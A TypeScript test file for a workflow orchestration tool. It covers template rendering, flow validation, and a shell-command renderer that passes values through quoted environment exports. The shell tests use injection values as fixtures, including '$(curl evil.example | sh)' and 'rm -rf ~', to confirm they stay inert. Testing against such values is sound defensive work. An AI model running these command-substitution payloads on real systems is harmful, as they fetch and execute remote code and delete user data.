import { describe, expect, test } from "bun:test";
import {
  type FlowDefinition,
  isActionStep,
  isAgentStep,
  isTruthyValue,
  loopRanges,
  renderShellCommand,
  renderTemplate,
  RunEvent,
  TemplateError,
  templateRefs,
  templateVariables,
  validateFlow,
} from "../src";

const ctx = {
  inputs: { issue: { url: "u", repo: "o/r", number: 7, title: "Fix it", body: "Body" }, note: "hello" },
  steps: { plan: { output: "the plan", structured: { files: ["a.ts"] } } },
};

describe("renderTemplate", () => {
  test("substitutes strings raw, numbers as text and objects as JSON", () => {
    expect(
      renderTemplate("{{inputs.issue.title}} #{{ inputs.issue.number }} {{inputs.note}} {{steps.plan.structured}}", ctx),
    ).toBe('Fix it #7 hello {"files":["a.ts"]}');
  });

  test("unknown path throws TemplateError naming the path", () => {
    expect(() => renderTemplate("{{steps.nope.output}}", ctx)).toThrow(TemplateError);
    expect(() => renderTemplate("x {{inputs.issue.labels}}", ctx)).toThrow("Unknown template variable: inputs.issue.labels");
  });

  test("does not resolve inherited properties", () => {
    expect(() => renderTemplate("{{inputs.constructor}}", ctx)).toThrow("Unknown template variable: inputs.constructor");
  });

  test("templateRefs lists every reference", () => {
    expect(templateRefs("a {{x.y}} b {{ z }}")).toEqual(["x.y", "z"]);
  });
});

describe("renderShellCommand", () => {
  const ctx = {
    inputs: { issue: { title: "$(curl evil.example | sh)", number: 7, note: "it's a 'test'" }, safe: "plain" },
    steps: { impl: { output: "rm -rf ~; `id`" } },
  };

  test("renders values as quoted env exports referenced by the script", () => {
    const script = renderShellCommand("make test N={{inputs.issue.number}} T={{inputs.safe}}", ctx);
    expect(script).toContain("export ORCH_REF_0='7'");
    expect(script).toContain("export ORCH_REF_1='plain'");
    expect(script.endsWith("\nmake test N=${ORCH_REF_0} T=${ORCH_REF_1}")).toBe(true);
  });

  test("keeps shell metacharacters in values inert, including quotes and newlines", () => {
    const script = renderShellCommand("echo {{inputs.issue.title}} {{steps.impl.output}} {{inputs.issue.note}}", ctx);
    const proc = Bun.spawnSync(["bash", "-c", script], { stdout: "pipe", stderr: "pipe" });
    expect(proc.exitCode).toBe(0);
    expect(proc.stdout.toString()).toBe("$(curl evil.example | sh) rm -rf ~; `id` it's a 'test'\n");
  });

  test("reuses one export for repeated references and errors on unknown paths", () => {
    const script = renderShellCommand("echo {{inputs.safe}} {{inputs.safe}}", ctx);
    expect(script.match(/export /g)).toHaveLength(1);
    expect(script).toBe("export ORCH_REF_0='plain'\necho ${ORCH_REF_0} ${ORCH_REF_0}");
    expect(() => renderShellCommand("echo {{inputs.missing}}", ctx)).toThrow(TemplateError);
  });
});

const baseFlow = {
  name: "f",
  inputs: [{ key: "issue", label: "Issue", type: "github_issue", required: true }],
  workspace: { kind: "local_path", path: "/repo", isolation: "worktree", baseRef: "HEAD", access: "rw" },
  harness: { id: "omp", model: "anthropic/claude-sonnet-4-5" },
};

describe("validateFlow", () => {
  test("accepts a full implementation flow and applies defaults", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "msg", name: "Msg", kind: "command", command: "commit-msg", args: "{{steps.impl.output}}" },
        { id: "commit", name: "Commit", kind: "git_commit", messageFrom: "msg" },
        { id: "push", name: "Push", kind: "git_push" },
        { id: "pr", name: "PR", kind: "github_pr", titleFrom: "msg", bodyFrom: "impl" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.sandbox.network.mode).toBe("gateway_only");
    expect(res.flow.approval).toBe("auto");
    expect(res.flow.steps[0]!.timeoutSec).toBe(1800);
  });

  test("accepts timeoutSec 0 as an infinite timeout and keeps it", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement it", timeoutSec: 0 },
        { id: "gate", name: "Gate", kind: "intervention", timeoutSec: 0 },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[0]!.timeoutSec).toBe(0);
    expect(res.flow.steps[1]!.timeoutSec).toBe(0);

    // Fractional and negative values stay invalid.
    expect(validateFlow({ ...baseFlow, steps: [{ id: "s", name: "S", kind: "git_push", timeoutSec: 1.5 }] }).ok).toBe(false);
    expect(validateFlow({ ...baseFlow, steps: [{ id: "s", name: "S", kind: "git_push", timeoutSec: -1 }] }).ok).toBe(false);
  });

  test("rejects forward step references in templates and *From fields", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "use {{steps.b.output}}" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "b" },
        { id: "b", name: "B", kind: "prompt", prompt: "hi" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.some((e) => e.includes("{{steps.b.output}}"))).toBe(true);
    expect(res.errors.some((e) => e.includes("messageFrom"))).toBe(true);
  });

  test("rejects action steps under direct isolation", () => {
    const res = validateFlow({
      ...baseFlow,
      workspace: { ...baseFlow.workspace, isolation: "direct" },
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "hi" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "a" },
      ],
    });
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.errors.join()).toContain('requires workspace isolation "worktree"');
  });

  test("rejects messageFrom pointing at an action step, undeclared inputs and bad issue subfields", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "{{inputs.missing}} {{inputs.issue.labels}}" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "a" },
        { id: "d", name: "D", kind: "git_commit", messageFrom: "c" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors).toHaveLength(3);
  });

  test("rejects github_pr without an earlier git_push and duplicate step ids", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "hi" },
        { id: "a", name: "A2", kind: "prompt", prompt: "hi" },
        { id: "pr", name: "PR", kind: "github_pr", titleFrom: "a", bodyFrom: "a" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.errors.some((e) => e.includes("duplicate step id"))).toBe(true);
    expect(res.errors.some((e) => e.includes("git_push"))).toBe(true);
  });

  test("rejects invalid allowlist domains", () => {
    const res = validateFlow({
      ...baseFlow,
      sandbox: { network: { mode: "allowlist", allow: ["http://evil.com"] } },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    expect(res.ok).toBe(false);
  });

  test("accepts a slash step with args templates and rejects bad command names", () => {
    const ok = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "check", name: "Check", kind: "slash", command: "review", args: "focus on {{steps.impl.output}}" },
      ],
    });
    if (!ok.ok) throw new Error(ok.errors.join("\n"));
    expect(ok.flow.steps[1]!.kind).toBe("slash");

    const bad = validateFlow({
      ...baseFlow,
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "hi" },
        { id: "s", name: "S", kind: "slash", command: "bad name" },
        { id: "t", name: "T", kind: "slash", command: "" },
        { id: "u", name: "U", kind: "slash", command: "with space" },
      ],
    });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.filter((e) => e.includes("command")).length).toBe(3);
  });

  test("accepts structured field declarations and rejects duplicates, bad names and empty descriptions", () => {
    const ok = validateFlow({
      ...baseFlow,
      steps: [{ id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "title", description: "PR title" }] } }],
    });
    if (!ok.ok) throw new Error(ok.errors.join("\n"));
    expect(ok.flow.steps[0]).toMatchObject({ structured: { fields: [{ name: "title", description: "PR title" }] } });

    const bad = validateFlow({
      ...baseFlow,
      steps: [
        {
          id: "gen",
          name: "Gen",
          kind: "prompt",
          prompt: "hi",
          structured: {
            fields: [
              { name: "title", description: "a" },
              { name: "title", description: "b" },
            ],
          },
        },
      ],
    });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.join()).toContain('structured.fields[1]: duplicate field name "title"');

    const malformed = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "Bad Name", description: "c" }] } },
        { id: "u", name: "U", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "ok", description: "" }] } },
      ],
    });
    expect(malformed.ok).toBe(false);
    if (malformed.ok) return;
    const all = malformed.errors.join("\n");
    expect(all).toContain("structured.fields.0.name: field name must match");
    expect(all).toContain("structured.fields.0.description");

    // Slash steps stay text-only.
    const slash = validateFlow({
      ...baseFlow,
      steps: [{ id: "s", name: "S", kind: "slash", command: "review", structured: { fields: [{ name: "x", description: "x" }] } }],
    });
    expect(slash.ok).toBe(false);
    if (!slash.ok) expect(slash.errors.join()).toContain("structured");
  });

  test("*From refs accept id, id.output and id.structured.<field>, rejecting unknown fields and bad grammar", () => {
    const steps = (messageFrom: string) => [
      { id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "title", description: "t" }] } },
      { id: "commit", name: "C", kind: "git_commit", messageFrom },
    ];
    for (const ref of ["gen", "gen.output", "gen.structured.title"]) {
      const res = validateFlow({ ...baseFlow, steps: steps(ref) });
      if (!res.ok) throw new Error(`${ref}: ${res.errors.join("\n")}`);
    }
    const bad = validateFlow({ ...baseFlow, steps: steps("gen.structured.nope") });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.join()).toContain('exposes only structured fields gen.structured.title');

    const noSpec = validateFlow({
      ...baseFlow,
      steps: [
        { id: "plain", name: "P", kind: "prompt", prompt: "hi" },
        { id: "commit", name: "C", kind: "git_commit", messageFrom: "plain.structured.title" },
      ],
    });
    // No spec: permissive (back-compat; replayed resume data may carry structured values).
    if (!noSpec.ok) throw new Error(noSpec.errors.join("\n"));

    const grammar = validateFlow({ ...baseFlow, steps: steps("gen.output.deep") });
    expect(grammar.ok).toBe(false);
    if (!grammar.ok) expect(grammar.errors.join()).toContain(".output or .structured.<field>");

    // Non-agent refs are still rejected with the base message.
    const action = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "title", description: "t" }] } },
        { id: "push", name: "Push", kind: "git_push" },
        { id: "pr", name: "PR", kind: "github_pr", titleFrom: "push", bodyFrom: "gen" },
      ],
    });
    expect(action.ok).toBe(false);
    if (!action.ok) expect(action.errors.join()).toContain('titleFrom: "push" must be an earlier prompt/skill/command step');
  });

  test("templates resolve steps.<id>.structured.<field> only for declared fields", () => {
    const bad = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "title", description: "t" }] } },
        { id: "use", name: "Use", kind: "prompt", prompt: "{{steps.gen.structured.nope}}" },
      ],
    });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.join()).toContain('step "gen" exposes only structured fields steps.gen.structured.title');

    const good = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "title", description: "t" }] } },
        { id: "use", name: "Use", kind: "prompt", prompt: "{{steps.gen.structured.title}}" },
      ],
    });
    if (!good.ok) throw new Error(good.errors.join("\n"));
  });

  test("structured template refs allow deeper nested paths (field values are arbitrary JSON)", () => {
    const nested = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Gen", kind: "prompt", prompt: "hi" },
        { id: "use", name: "Use", kind: "prompt", prompt: "{{steps.gen.structured.files.0}}" },
      ],
    });
    // No spec: permissive at any depth (back-compat; the renderer walks nested values).
    if (!nested.ok) throw new Error(nested.errors.join("\n"));

    const specNested = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Gen", kind: "prompt", prompt: "hi", structured: { fields: [{ name: "files", description: "t" }] } },
        { id: "use", name: "Use", kind: "prompt", prompt: "{{steps.gen.structured.files.0}}" },
      ],
    });
    // With a spec the first path segment is validated; deeper segments stay permissive.
    if (!specNested.ok) throw new Error(specNested.errors.join("\n"));
  });

  test("accepts a shell step whose command templates earlier steps and inputs", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "run", name: "Run", kind: "shell", command: "make test ARGS={{inputs.issue.number}} OUT={{steps.impl.output}}" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[1]).toMatchObject({ kind: "shell", timeoutSec: 1800 });
  });

  test("rejects shell steps with empty commands and forward step references", () => {
    const empty = validateFlow({
      ...baseFlow,
      steps: [{ id: "run", name: "Run", kind: "shell", command: "" }],
    });
    expect(empty.ok).toBe(false);
    if (!empty.ok) expect(empty.errors.join()).toContain("steps.0.command");

    const forward = validateFlow({
      ...baseFlow,
      steps: [
        { id: "use", name: "Use", kind: "shell", command: "echo {{steps.later.output}}" },
        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
      ],
    });
    expect(forward.ok).toBe(false);
    if (!forward.ok) {
      expect(forward.errors.some((e) => e.includes('steps.0 (use).command: {{steps.later.output}} references step "later" which is not an earlier step'))).toBe(true);
    }
  });

  test("accepts extra harness model roles and rejects default/smol and malformed role keys", () => {
    const ok = validateFlow({
      ...baseFlow,
      harness: { ...baseFlow.harness, modelRoles: { slow: "anthropic/claude-opus-4-5", plan: "litellm/glm-5.3" } },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    if (!ok.ok) throw new Error(ok.errors.join("\n"));
    expect(ok.flow.harness.modelRoles).toEqual({ slow: "anthropic/claude-opus-4-5", plan: "litellm/glm-5.3" });

    const bad = validateFlow({
      ...baseFlow,
      harness: { ...baseFlow.harness, modelRoles: { default: "x/y", smol: "x/y", "bad key": "x/y" } },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    expect(bad.ok).toBe(false);
    if (bad.ok) return;
    expect(bad.errors.some((e) => e.includes("modelRoles.default: set harness.model instead"))).toBe(true);
    expect(bad.errors.some((e) => e.includes("modelRoles.smol: set harness.smolModel instead"))).toBe(true);
    expect(bad.errors.some((e) => e.includes("modelRoles.bad key: role must match"))).toBe(true);
  });

  test("accepts an intervention step with an optional timeout and templated message", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
        { id: "gate", name: "Review", kind: "intervention", message: "Check {{steps.impl.output}} before continuing" },
        { id: "after", name: "After", kind: "prompt", prompt: "{{steps.gate.output}}" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    const gate = res.flow.steps[1];
    expect(gate).toMatchObject({ kind: "intervention", message: "Check {{steps.impl.output}} before continuing" });
    expect(gate!.timeoutSec).toBeUndefined();

    const withTimeout = validateFlow({
      ...baseFlow,
      steps: [{ id: "gate", name: "Gate", kind: "intervention", message: "ok?", timeoutSec: 600 }],
    });
    if (!withTimeout.ok) throw new Error(withTimeout.errors.join("\n"));
    expect(withTimeout.flow.steps[0]!.timeoutSec).toBe(600);

    // message templates cannot reference later steps
    const fwd = validateFlow({
      ...baseFlow,
      steps: [
        { id: "gate", name: "Gate", kind: "intervention", message: "{{steps.after.output}}" },
        { id: "after", name: "After", kind: "prompt", prompt: "x" },
      ],
    });
    expect(fwd.ok).toBe(false);
  });
});

describe("intervention steps", () => {
  test("is not an action step", () => {
    const step = { id: "gate", name: "Gate", kind: "intervention" };
    expect(isActionStep(step as never)).toBe(false);
    expect(isAgentStep(step as never)).toBe(false);
  });
});

const prFlow = {
  name: "pr-review",
  inputs: [{ key: "pr", label: "Pull request", type: "github_pull_request" }],
  workspace: { kind: "github_checkout" },
  harness: { id: "omp", model: "anthropic/claude-sonnet-4-5" },
  steps: [{ id: "review", name: "Review", kind: "prompt", prompt: "Review {{inputs.pr.title}} using {{inputs.pr.diffPath}}" }],
};

describe("validateFlow for flows with a pull request input", () => {
  test("accepts a manual review flow with a gate and a github_comment posting the final review", () => {
    const res = validateFlow({
      ...prFlow,
      inputs: [...prFlow.inputs, { key: "focus", label: "Focus", type: "text" }],
      steps: [
        ...prFlow.steps,
        { id: "gate", name: "Verify", kind: "intervention" },
        { id: "write", name: "Write", kind: "prompt", prompt: "Write the review for {{inputs.pr.url}}: {{steps.gate.output}} {{inputs.focus}}" },
        { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "write" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.trigger).toEqual({ kind: "manual" });
  });

  test("the github_pull_request trigger fills the PR input and applies defaults", () => {
    const res = validateFlow({ ...prFlow, trigger: { kind: "github_pull_request", repos: ["o/r"] } });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.trigger).toEqual({
      kind: "github_pull_request",
      repos: ["o/r"],
      events: ["opened", "synchronize", "reopened", "ready_for_review"],
      forkPolicy: "require_approval",
      postChecks: true,
    });
  });

  test("rejects local workspaces, action steps, ask approval, open network and unknown pr fields", () => {
    const res = validateFlow({
      ...prFlow,
      workspace: { kind: "local_path", path: "/repo" },
      approval: "ask",
      sandbox: { network: { mode: "open", allow: [] } },
      steps: [
        { id: "a", name: "A", kind: "prompt", prompt: "{{inputs.pr.author}}" },
        { id: "c", name: "C", kind: "git_commit", messageFrom: "a" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    const all = res.errors.join("\n");
    for (const needle of ["github_checkout", 'approval "auto"', '"open"', 'github_pull_request input "pr" exposes only', "cannot contain git_commit"]) {
      expect(all).toContain(needle);
    }
  });

  test("rejects a second or optional PR input, and required extra inputs under the PR trigger", () => {
    const res = validateFlow({
      ...prFlow,
      trigger: { kind: "github_pull_request", repos: ["o/r"] },
      inputs: [
        ...prFlow.inputs,
        { key: "other", label: "Other", type: "github_pull_request", required: false },
        { key: "note", label: "Note", type: "text" },
      ],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    const all = res.errors.join("\n");
    for (const needle of ["at most one github_pull_request input", "inputs.other: github_pull_request inputs must be required", "inputs.note: must be optional"]) {
      expect(all).toContain(needle);
    }
  });

  test("accepts shell steps in flows with a pull request input", () => {
    const res = validateFlow({
      ...prFlow,
      steps: [...prFlow.steps, { id: "run", name: "Run", kind: "shell", command: "cat {{inputs.pr.diffPath}}" }],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps.at(-1)).toMatchObject({ kind: "shell" });
  });

  test("github_checkout and the PR trigger need the PR input", () => {
    const res = validateFlow({
      ...prFlow,
      inputs: [],
      trigger: { kind: "github_pull_request", repos: ["o/r"] },
      steps: [{ id: "a", name: "A", kind: "prompt", prompt: "hi" }],
    });
    expect(res.ok).toBe(false);
    if (res.ok) return;
    const all = res.errors.join("\n");
    for (const needle of ['"github_checkout" requires a github_pull_request input', "trigger requires a github_pull_request input"]) {
      expect(all).toContain(needle);
    }
  });
});

describe("github_comment steps", () => {
  test("comment on a required issue input of a local flow", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "Fix {{inputs.issue.title}}" },
        { id: "note", name: "Note", kind: "github_comment", target: "issue", bodyFrom: "impl" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
  });

  test("target must be a required GitHub input", () => {
    const steps = (target: string) => [
      { id: "impl", name: "Implement", kind: "prompt", prompt: "x" },
      { id: "note", name: "Note", kind: "github_comment", target, bodyFrom: "impl" },
    ];
    const inputs = [
      { key: "issue", label: "Issue", type: "github_issue", required: false },
      { key: "text", label: "Text", type: "text" },
    ];
    for (const target of ["issue", "text", "missing"]) {
      const res = validateFlow({ ...baseFlow, inputs, steps: steps(target) });
      expect(res.ok).toBe(false);
      if (!res.ok) expect(res.errors.join()).toContain(`target: "${target}" must be a required github_issue or github_pull_request input`);
    }
  });

  test("bodyFrom must be an earlier text step", () => {
    const later = validateFlow({
      ...prFlow,
      steps: [{ id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "review" }, ...prFlow.steps],
    });
    expect(later.ok).toBe(false);
    if (!later.ok) expect(later.errors.join()).toContain('bodyFrom: "review" must be an earlier');
    const chained = validateFlow({
      ...prFlow,
      steps: [
        ...prFlow.steps,
        { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "review" },
        { id: "again", name: "Again", kind: "github_comment", target: "pr", bodyFrom: "post" },
      ],
    });
    expect(chained.ok).toBe(false);
    if (!chained.ok) expect(chained.errors.join()).toContain('bodyFrom: "post" must be an earlier');
  });

  test("bodyFrom accepts id, id.output and id.structured.<field> of an earlier text step", () => {
    const flowWith = (bodyFrom: string, impl: Record<string, unknown>) =>
      validateFlow({
        ...prFlow,
        steps: [
          { id: "impl", name: "Impl", kind: "prompt", prompt: "hi", ...impl },
          { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom },
        ],
      });
    for (const ref of ["impl", "impl.output", "impl.structured.body"]) {
      const res = flowWith(ref, { structured: { fields: [{ name: "body", description: "b" }] } });
      if (!res.ok) throw new Error(`${ref}: ${res.errors.join("\n")}`);
    }
    // Unknown field.
    const unknownField = flowWith("impl.structured.nope", { structured: { fields: [{ name: "body", description: "b" }] } });
    expect(unknownField.ok).toBe(false);
    if (!unknownField.ok) expect(unknownField.errors.join()).toContain("exposes only structured fields impl.structured.body");
    // Wrong grammar.
    const badGrammar = flowWith("impl.output.deep", {});
    expect(badGrammar.ok).toBe(false);
    if (!badGrammar.ok) expect(badGrammar.errors.join()).toContain(".output or .structured.<field>");
    // No spec: permissive (back-compat; replayed resume data).
    const noSpec = flowWith("impl.structured.body", {});
    if (!noSpec.ok) throw new Error(noSpec.errors.join("\n"));
    // A slash step without structured output is a valid plain-id source.
    const slash = validateFlow({
      ...prFlow,
      steps: [
        { id: "review", name: "Review", kind: "slash", command: "review" },
        { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "review" },
      ],
    });
    if (!slash.ok) throw new Error(slash.errors.join("\n"));
  });

  test("structured refs on non-agent sources are rejected for github_comment bodyFrom", () => {
    const res = validateFlow({
      ...prFlow,
      steps: [
        { id: "review", name: "Review", kind: "slash", command: "review" },
        { id: "post", name: "Post", kind: "github_comment", target: "pr", bodyFrom: "review.structured.body" },
      ],
    });
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.errors.join()).toContain("references structured output, which only prompt/skill/command steps can produce");
  });

  test("bodyFrom accepts a shell step", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "probe", name: "Probe", kind: "shell", command: "make test" },
        { id: "post", name: "Post", kind: "github_comment", target: "issue", bodyFrom: "probe" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[1]).toMatchObject({ kind: "github_comment", bodyFrom: "probe" });
  });
});

describe("templateVariables", () => {
  const parse = (def: unknown): FlowDefinition => {
    const res = validateFlow(def);
    if (!res.ok) throw new Error(res.errors.join("\n"));
    return res.flow;
  };
  /** Replaces step `idx` with a prompt referencing every listed variable; the flow must still validate. */
  const expectAllValid = (def: FlowDefinition, idx: number) => {
    const prompt = templateVariables(def, idx).map((v) => `{{${v.path}}}`).join(" ");
    const steps = def.steps.map((s, i) => (i === idx ? { id: s.id, name: s.name, kind: "prompt", prompt } : s));
    parse({ ...def, steps });
  };

  test("lists inputs and earlier steps only, with structured just for agent steps", () => {
    const def = parse({
      ...baseFlow,
      inputs: [...baseFlow.inputs, { key: "note", label: "Note", type: "text", required: false }],
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "go" },
        { id: "commit", name: "Commit", kind: "git_commit", messageFrom: "impl" },
        { id: "review", name: "Review", kind: "prompt", prompt: "check" },
        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
      ],
    });
    const paths = templateVariables(def, 2).map((v) => v.path);
    expect(paths).toEqual([
      "inputs.issue",
      "inputs.issue.url",
      "inputs.issue.repo",
      "inputs.issue.number",
      "inputs.issue.title",
      "inputs.issue.body",
      "inputs.note",
      "steps.impl.output",
      "steps.impl.structured",
      "steps.commit.output",
    ]);
    expect(templateVariables(def, 0).some((v) => v.path.startsWith("steps."))).toBe(false);
    for (let i = 0; i < def.steps.length; i++) expectAllValid(def, i);
  });

  test("pull request inputs expose their fields", () => {
    const def = parse({
      ...prFlow,
      steps: [...prFlow.steps, { id: "summary", name: "Summary", kind: "prompt", prompt: "sum up" }],
    });
    const paths = templateVariables(def, 1).map((v) => v.path);
    expect(paths).toContain("inputs.pr");
    expect(paths).toContain("inputs.pr.url");
    expect(paths).toContain("inputs.pr.diffPath");
    expect(paths).toContain("steps.review.structured");
    expectAllValid(def, 1);
  });

  test("declared structured fields replace the bare structured entry and carry the description", () => {
    const def = parse({
      ...baseFlow,
      steps: [
        {
          id: "gen",
          name: "Generate",
          kind: "prompt",
          prompt: "go",
          structured: {
            fields: [
              { name: "title", description: "PR title" },
              { name: "body", description: "PR body" },
            ],
          },
        },
        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
      ],
    });
    const vars = templateVariables(def, 1);
    expect(vars).toEqual(
      expect.arrayContaining([
        { path: "steps.gen.output", description: 'Text output of "Generate"' },
        { path: "steps.gen.structured.title", description: 'PR title (of "Generate" via submit_output)' },
        { path: "steps.gen.structured.body", description: 'PR body (of "Generate" via submit_output)' },
      ]),
    );
    expect(vars.some((v) => v.path === "steps.gen.structured")).toBe(false);
    // The bare entry remains for steps without a spec.
    const plain = parse({
      ...baseFlow,
      steps: [
        { id: "gen", name: "Generate", kind: "prompt", prompt: "go" },
        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
      ],
    });
    expect(templateVariables(plain, 1).map((v) => v.path)).toContain("steps.gen.structured");
    for (let i = 0; i < def.steps.length; i++) expectAllValid(def, i);
  });
});

describe("loop steps", () => {
  const review = {
    id: "review",
    name: "Review",
    kind: "prompt",
    prompt: "review",
    structured: { fields: [{ name: "approved", description: "true when ready" }] },
  };
  const fix = { id: "fix", name: "Fix", kind: "prompt", prompt: "fix" };
  const loop = (extra: Record<string, unknown> = {}) => ({ id: "again", name: "Review/fix", kind: "loop", to: "review", maxIterations: 3, ...extra });
  const errorsOf = (steps: unknown[]) => {
    const res = validateFlow({ ...baseFlow, steps });
    return res.ok ? [] : res.errors;
  };

  test("accepts the review/fix example and applies defaults", () => {
    const res = validateFlow({
      ...baseFlow,
      steps: [
        { id: "impl", name: "Implement", kind: "prompt", prompt: "go" },
        review,
        fix,
        loop({ stop: { when: "value", ref: "review.structured.approved", is: "truthy" } }),
        { id: "gate", name: "Gate", kind: "intervention" },
      ],
    });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    expect(res.flow.steps[3]).toMatchObject({ kind: "loop", onExhausted: "continue" });
    expect(loopRanges(res.flow)).toEqual(new Map([[3, 1]]));
    const plain = validateFlow({ ...baseFlow, steps: [review, fix, loop()] });
    if (!plain.ok) throw new Error(plain.errors.join("\n"));
    expect(plain.flow.steps[2]).toMatchObject({ stop: { when: "max" } });
  });

  test("to must name an earlier step that is not a loop", () => {
    expect(errorsOf([review, loop({ to: "fix" }), fix]).some((e) => e.includes("steps.1 (again).to"))).toBe(true);
    expect(errorsOf([review, loop({ to: "again" })]).some((e) => e.includes(".to"))).toBe(true);
    const toLoop = errorsOf([review, loop(), { id: "outer", name: "Outer", kind: "loop", to: "again", maxIterations: 2 }]);
    expect(toLoop).toEqual([`steps.2 (outer).to: "again" must be an earlier step that is not a loop`]);
    expect(errorsOf([review, loop({ maxIterations: 21 })]).length).toBeGreaterThan(0);
    expect(errorsOf([review, loop({ maxIterations: 0 })]).length).toBeGreaterThan(0);
  });

  test("nested loops are accepted, crossing loops rejected", () => {
    const a = { id: "a", name: "A", kind: "prompt", prompt: "a" };
    const b = { id: "b", name: "B", kind: "prompt", prompt: "b" };
    const c = { id: "c", name: "C", kind: "prompt", prompt: "c" };
    const inner = { id: "inner", name: "Inner", kind: "loop", to: "b", maxIterations: 2 };
    expect(errorsOf([a, b, inner, c, { id: "outer", name: "Outer", kind: "loop", to: "a", maxIterations: 2 }])).toEqual([]);
    // Same start is nesting too.
    expect(errorsOf([a, b, { ...inner, to: "a" }, c, { id: "outer", name: "Outer", kind: "loop", to: "a", maxIterations: 2 }])).toEqual([]);
    const crossing = errorsOf([a, b, { ...inner, to: "a" }, c, { id: "outer", name: "Outer", kind: "loop", to: "b", maxIterations: 2 }]);
    expect(crossing).toEqual([`steps.4 (outer).to: this loop's body crosses loop "inner"; loops must be nested or disjoint`]);
  });

  test("value stop refs must sit directly in the body and match the step's outputs", () => {
    const stop = (ref: string) => loop({ stop: { when: "value", ref, is: "truthy" } });
    expect(errorsOf([review, fix, stop("fix.output")])).toEqual([]);
    expect(errorsOf([review, fix, stop("review.structured.approved")])).toEqual([]);
    expect(errorsOf([{ id: "plan", name: "Plan", kind: "prompt", prompt: "p" }, review, fix, stop("plan.output")])[0]).toContain(
      'stop.ref: "plan.output" must reference a step inside this loop\'s body',
    );
    expect(errorsOf([review, fix, stop("review.structured.nope")])[0]).toContain("exposes only structured fields review.structured.approved");
    expect(errorsOf([review, fix, stop("fix.structured.x")])).toEqual([]);
    expect(errorsOf([review, fix, stop("review")])[0]).toContain("must be <stepId>.output or <stepId>.structured.<field>");
    const shell = { id: "check", name: "Check", kind: "shell", command: "true" };
    expect(errorsOf([review, shell, stop("check.structured.x")])[0]).toContain("only prompt/skill/command steps");
